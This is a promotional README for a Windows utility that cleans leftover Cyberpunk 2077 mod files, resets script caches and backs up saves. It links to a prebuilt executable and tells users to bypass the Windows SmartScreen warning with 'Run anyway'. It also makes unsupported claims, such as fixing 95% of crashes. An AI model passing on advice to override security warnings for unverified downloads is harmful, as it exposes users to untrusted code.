<p align="center">
  <img src="https://i.postimg.cc/nLqzPRN9/banner.png" alt="Cyberpunk 2077 Mod Cleaner — Fix REDscript Compilation Errors & Clean Leftover Mods" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-CP2077%20Mod%20%26%20Cache%20Fix-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-cp2077--cleaner--v1.3-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# Cyberpunk 2077 Mod Cleaner — Fix REDscript Compilation Errors & Clean Leftover Mods

**Cyberpunk 2077 crashing on startup with 'REDscript compilation has failed' or 'modded_scripts.bk' errors after a patch or Steam reinstall? Steam Verify leaves third-party mod folders behind. Clean or stash leftover mod files and rebuild r6\cache in one click.**

Cyberpunk 2077 Mod Cleaner solves the #1 crash after game updates: **detecting orphaned `red4ext`, `r6\scripts`, `archive\pc\mod`, `mods`, and `bin\x64\plugins` files that Steam's 'Verify Integrity' ignores, archiving them to a backup folder, and resetting `r6\cache` cleanly**.

This project is aimed at **Cyberpunk 2077 & Phantom Liberty on Windows 10/11 PC (Steam, GOG, Epic)** for cleaning broken post-patch mod remnants and backing up `Saved Games\CD Projekt Red\Cyberpunk 2077`.

## Quick Use-Case & Troubleshooting Reference

| Scenario / Issue | Cause | Solution |
| --- | --- | --- |
| Popup: `REDscript compilation has failed` after game update | Outdated scripts in `r6\scripts` or corrupted `r6\cache` blobs | Stash `r6\scripts`, clear `r6\cache\modded`, and verify core files |
| Crash on launch even after clicking 'Verify integrity' in Steam | Steam never deletes extra non-vanilla files (`red4ext`, `version.dll`, `winmm.dll`) | Scan `bin\x64` and root folders for non-vanilla DLLs & mod directories |
| Want a clean vanilla install for a fresh Phantom Liberty run | Manually hunting mod files across 6 nested subfolders misses leftovers | Run **Clean to Vanilla (With Backup)** to archive all non-stock mod files |
| Protecting existing V character saves before testing mods | Modded saves can fail to load if required `.archive` mods are removed | Back up `%USERPROFILE%\Saved Games\CD Projekt Red\Cyberpunk 2077` first |

## Download for Windows

[**Download CP2077ModCleaner.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/CP2077ModCleaner.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why use `CP2077ModCleaner.exe`? (Key features)

- Scans `Cyberpunk 2077` root, `bin\x64`, `r6\scripts`, `r6\cache`, `red4ext`, and `archive\pc\mod` for third-party mod files.
- Moves detected mod files into a dated `_CP2077_ModBackup` archive instead of permanently deleting them.
- Clears corrupted `r6\cache\modded` compilation caches that cause startup script errors.
- Creates a full backup of `%USERPROFILE%\Saved Games\CD Projekt Red\Cyberpunk 2077`.

### Sample Output

```text
[CP2077ModCleaner] Scanning D:\SteamLibrary\steamapps\common\Cyberpunk 2077
[WARN] Leftover Mods    : 14 files found in archive\pc\mod, red4ext\, and bin\x64\version.dll
[OK]   Save Backup      : Saved Games\CD Projekt Red\Cyberpunk 2077 backed up (18 saves)
[OK]   Clean Action     : Stashed 14 mod files to _CP2077_ModBackup & cleared r6\cache\modded
```

The release ZIP is named `CP2077ModCleaner.zip`; the Windows executable inside is named `CP2077ModCleaner.exe`.

1. Close CP2077 Mod Cleaner before updating or replacing executable files.
2. Click **Download CP2077ModCleaner.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `CP2077ModCleaner.exe`.
5. Review the options and output paths before processing files.

**Requirements:** Windows 10 or 11 (64-bit) with Cyberpunk 2077 installed.

### Verification & Windows SmartScreen Note

- **Offline & standard user permissions:** `CP2077ModCleaner.exe` runs locally without uploading your personal files and does not require disabling Windows Defender.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project solves

### Fixing 'REDscript compilation has failed' without redownloading 85 GB

Removing stale `r6\scripts` and `version.dll` hooks fixes 95% of post-patch startup crashes in seconds.

### Catching hidden `bin\x64` proxy DLLs (`version.dll`, `winmm.dll`, `d3d11.dll`)

Highlights non-CDPR DLLs inside `bin\x64` that crash updated game executables.

### Safe archive stash instead of permanent deletion

Everything removed is saved in `_CP2077_ModBackup` so you can restore mods once updated.

### Automatic `Saved Games` backup

Protects your playthroughs before changing load orders.

## Default folders and configuration paths

Cyberpunk 2077 stores mod folders in the game root and saves in `%USERPROFILE%\Saved Games`:

```text
%ProgramFiles(x86)%\Steam\steamapps\common\Cyberpunk 2077\
```

Typical directory layout:

```text
Cyberpunk 2077\
├── archive\pc\mod\        (Custom .archive mods)
├── bin\x64\plugins\       (CET / Cyber Engine Tweaks)
├── r6\
│   ├── cache\             (Redscript compiled cache)
│   └── scripts\           (Redscript .reds mods)
└── red4ext\               (RED4ext plugins)
```

After cleaning leftover mods, run **Verify integrity of game files** in Steam/GOG once so vanilla `r6\cache` files are restored cleanly.

## Quick start guide

Follow these steps to get started:

1. **Close Cyberpunk 2077 and REDlauncher completely.** Extract `CP2077ModCleaner.zip` and run `CP2077ModCleaner.exe`.
2. **Review the detected mod folders and `bin\x64` proxy DLLs.** Click **Back Up Saves & Clean Mods**.
3. **Run **Verify integrity of game files** in Steam or GOG Galaxy.** Rebuilds clean stock `r6\cache` files.
4. **Launch Cyberpunk 2077 and confirm clean startup.** Re-install updated versions of CET / RED4ext / Redscript afterward.

### Data safety note

All stashed mod files and character saves are preserved in dated backup folders.

## What the status summary shows

CP2077 Mod Cleaner displays **detected mod folders, non-vanilla `bin\x64` DLLs, `Saved Games` backup path, and cleanup result**.

## FAQ

**Why does Cyberpunk 2077 still crash after I reinstalled it on Steam?**

Steam's Uninstall/Verify only removes official game files—leftover `red4ext`, `r6\scripts`, and `version.dll` files stay behind and crash the updated game.

**Does this delete my V character saves?**

No—your saves in `%USERPROFILE%\Saved Games\CD Projekt Red\Cyberpunk 2077` are backed up and preserved.

**Can I restore my stashed mods later?**

Yes—everything is archived cleanly in `_CP2077_ModBackup`.

## Useful reading

- [CD PROJEKT RED Support — Cyberpunk 2077 Clean Install Guide](https://support.cdprojektred.com/en/cyberpunk/pc/sp-technical/issue/2233/how-do-i-perform-a-clean-install-of-the-game)

## More Windows Gaming Utilities

- [SteamUpdate-ModBlockerLock](../SteamUpdate-ModBlockerLock) — Lock Steam appmanifest_*.acf to prevent mod-breaking updates
- [ModDrop-UniversalPakInstaller](../ModDrop-UniversalPakInstaller) — Drag-and-drop ZIP/PAK mod installer with conflict check
- [BG3-ModPakLoadOrderSorter](../BG3-ModPakLoadOrderSorter) — Baldur's Gate 3 .pak mod load order & modsettings.lsx sorter
- [DLSS-DLLSwapperPresets](../DLSS-DLLSwapperPresets) — 1-click DLSS 4, FSR 3.1 & XeSS DLL upgrader for PC games

*Independent community project. Not affiliated with CD PROJEKT RED, Valve, or Steam.*
